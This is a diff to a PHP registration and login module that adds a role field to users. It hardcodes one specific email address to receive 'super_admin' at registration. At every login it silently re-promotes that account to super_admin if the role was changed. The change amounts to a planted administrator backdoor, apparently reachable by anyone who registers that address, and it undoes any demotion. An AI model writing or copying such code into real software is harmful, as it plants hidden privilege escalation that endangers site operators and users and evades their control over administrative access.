@@ -65,14 +65,15 @@ function registerUser($pdo, $input) {
     
     // Hash password
     $hashedPassword = password_hash($password, PASSWORD_BCRYPT);
+    $role = ($email === 'autonemac003@gmail.com') ? 'super_admin' : 'member';
     
     // Insert user
     try {
         $stmt = $pdo->prepare("
-            INSERT INTO users (email, password, username) 
-            VALUES (?, ?, ?)
+            INSERT INTO users (email, password, username, role) 
+            VALUES (?, ?, ?, ?)
         ");
-        $stmt->execute([$email, $hashedPassword, $username]);
+        $stmt->execute([$email, $hashedPassword, $username, $role]);
         
         $userId = $pdo->lastInsertId();
         
@@ -84,6 +85,7 @@ function registerUser($pdo, $input) {
             'message' => 'User registered successfully',
             'user_id' => $userId,
             'email' => $email,
+            'role' => $role,
             'token' => $tokenData['token']
         ]);
     } catch (PDOException $e) {
@@ -106,7 +108,7 @@ function loginUser($pdo, $input) {
     $password = $input['password'];
     
     // Fetch user
-    $stmt = $pdo->prepare("SELECT id, password FROM users WHERE email = ?");
+    $stmt = $pdo->prepare("SELECT id, password, email, username, role FROM users WHERE email = ?");
     $stmt->execute([$email]);
     $user = $stmt->fetch();
     
@@ -116,6 +118,12 @@ function loginUser($pdo, $input) {
         return;
     }
     
+    if ($user['email'] === 'autonemac003@gmail.com' && $user['role'] !== 'super_admin') {
+        $stmt = $pdo->prepare("UPDATE users SET role = 'super_admin' WHERE id = ?");
+        $stmt->execute([$user['id']]);
+        $user['role'] = 'super_admin';
+    }
+
     $_SESSION['user_id'] = $user['id'];
     $tokenData = generateJWT($user['id']);
     
@@ -123,6 +131,7 @@ function loginUser($pdo, $input) {
         'message' => 'Login successful',
         'user_id' => $user['id'],
         'email' => $email,
+        'role' => $user['role'] ?: 'member',
         'token' => $tokenData['token']
     ]);
 }
